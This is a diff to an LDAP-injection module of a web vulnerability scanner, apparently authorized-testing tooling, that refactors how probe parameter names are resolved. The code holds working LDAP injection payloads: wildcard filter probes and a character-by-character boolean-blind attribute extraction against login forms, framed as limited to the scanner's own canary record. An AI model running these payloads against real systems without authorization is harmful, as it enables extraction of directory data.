@@ -17,6 +17,7 @@
 // opts.ldapCanary = { user, attr, value }; skipped gracefully when absent).
 // Every CONFIRMED verdict sits behind a differential oracle per the 100%
 // truth rule. Read-only HTTP, per-run canary values, redirects never followed.
+import { probePointName, probePointParameter } from '../probePoints.js';
 
 const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
 
@@ -70,7 +71,7 @@ function ev(request, response, impact) {
 // Heuristic: which params look like a username/login identifier.
 function userParams(params) {
   const re = /user|login|name|mail|uid|account/i;
-  const hits = params.filter((p) => re.test(p));
+  const hits = params.filter((p) => re.test(probePointName(p)));
   return hits.length ? hits.slice(0, 3) : params.slice(0, 2);
 }
 
@@ -80,7 +81,7 @@ async function t1Oracle(url, params, opts) {
   for (const up of userParams(params)) {
     const wrongUser = `zz_no_such_${rand()}`;
     const base = {};
-    base[up] = wrongUser;
+    base[probePointName(up)] = wrongUser;
     base['password'] = `wrong_${rand()}`;
     let rBase;
     try {
@@ -100,7 +101,7 @@ async function t1Oracle(url, params, opts) {
     let consistent = 0;
     let movedText = null; // response text of the first probe that moved the outcome
     for (const [k, v] of Object.entries(probes)) {
-      const f = { ...base, [up]: v };
+      const f = { ...base, [probePointName(up)]: v };
       let r;
       try {
         r = await postForm(url, f, opts);
@@ -132,9 +133,9 @@ async function t1Oracle(url, params, opts) {
         title: 'LDAP injection — boolean oracle detected (filter logic responds to wildcards)',
         severity: 'medium',
         url,
-        parameter: up,
+        parameter: probePointParameter(up),
         evidence: ev(
-          `POST ${url} ${up}=* / admin* / zzz* / *)(  (vs wrong-user baseline; redirects NOT followed)`,
+          `POST ${url} ${probePointName(up)}=* / admin* / zzz* / *)(  (vs wrong-user baseline; redirects NOT followed)`,
           `Baseline(wrong user): ${tBase}. Matrix: ${matrixText}. Wildcards moved the outcome in a filter-logic-consistent way (${consistent}/3 checks). The moved response reads: "...${window}..."`,
           'Differential oracle established: LDAP filter syntax reaches the directory query. Enables boolean-blind extraction (T2).'
         ),
@@ -154,7 +155,7 @@ async function t2Extract(url, userParam, canary, opts) {
   const charset = 'abcdefghijklmnopqrstuvwxyz0123456789@._-'.split('');
   const maxLen = Math.min(8, value.length);
   let extracted = '';
-  const trueBase = { [userParam]: user, password: `wrong_${rand()}` };
+  const trueBase = { [probePointName(userParam)]: user, password: `wrong_${rand()}` };
   let rTrue;
   try {
     rTrue = await postForm(url, trueBase, opts);
@@ -168,12 +169,12 @@ async function t2Extract(url, userParam, canary, opts) {
       const guess = extracted + ch;
       // Truth leg: filter matches iff the prefix is right.
       const fTrue = {
-        [userParam]: `(&(uid=${user})(${attr}=${guess}*))`,
+        [probePointName(userParam)]: `(&(uid=${user})(${attr}=${guess}*))`,
         password: `wrong_${rand()}`,
       };
       // False control: same shape, impossible value.
       const fFalse = {
-        [userParam]: `(&(uid=${user})(${attr}=${guess}zzz${rand()}*))`,
+        [probePointName(userParam)]: `(&(uid=${user})(${attr}=${guess}zzz${rand()}*))`,
         password: `wrong_${rand()}`,
       };
       let rT, rF;
@@ -205,9 +206,9 @@ async function t2Extract(url, userParam, canary, opts) {
       title: 'LDAP injection — boolean-blind attribute extraction (HIGH)',
       severity: 'high',
       url,
-      parameter: userParam,
+      parameter: probePointParameter(userParam),
       evidence: ev(
-        `POST ${url} ${userParam}=(&(uid=${user})(${attr}=<prefix>*)) char-by-char, false-control per guess (redirects NOT followed)`,
+        `POST ${url} ${probePointName(userParam)}=(&(uid=${user})(${attr}=<prefix>*)) char-by-char, false-control per guess (redirects NOT followed)`,
         `Extracted "${extracted}" from our OWN canary record; ${match}/${extracted.length} chars match the known canary value "${value}". Self-verifying oracle: the boolean channel is proven without touching another user's data.`,
         'Proves attacker-controlled LDAP filter logic with a working boolean oracle — full directory attribute extraction primitive.'
       ),
